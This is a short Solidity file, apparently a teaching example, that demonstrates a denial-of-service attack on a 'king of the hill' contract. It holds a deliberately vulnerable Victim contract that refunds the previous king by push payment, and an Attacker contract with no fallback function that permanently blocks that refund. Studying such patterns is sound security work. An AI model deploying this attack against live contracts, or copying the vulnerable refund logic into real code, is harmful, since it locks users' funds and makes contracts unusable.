// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice Denial of Service (DOS): make a contract unusable
 * Attacker is the new king but he does not have a fallback function
 */

contract Victim {
    address public king;
    uint256 public balance;

    error Victim_NotEnoughEthToBeKing();
    error Victim_FailedToSendEther();

    //init the contract
    constructor () payable {
        balance = msg.value;
    }

    function claimThrone() external payable {
        if (msg.value <= balance) {
            revert Victim_NotEnoughEthToBeKing();
        }
        //give back money to previous king
        (bool sent,) = king.call{value: balance}("");
        if (!sent) {
            revert Victim_FailedToSendEther();
        }
        balance = msg.value;
        king = msg.sender;
    }
}

contract Attacker {
    Victim victim;

    constructor(address _victim) {
        victim = Victim(_victim);
    }

    function attackWithLogic() public payable {
        victim.claimThrone{value: msg.value}();
    }

    function attackWithAssert() public payable {
        assert(false);
    }
}
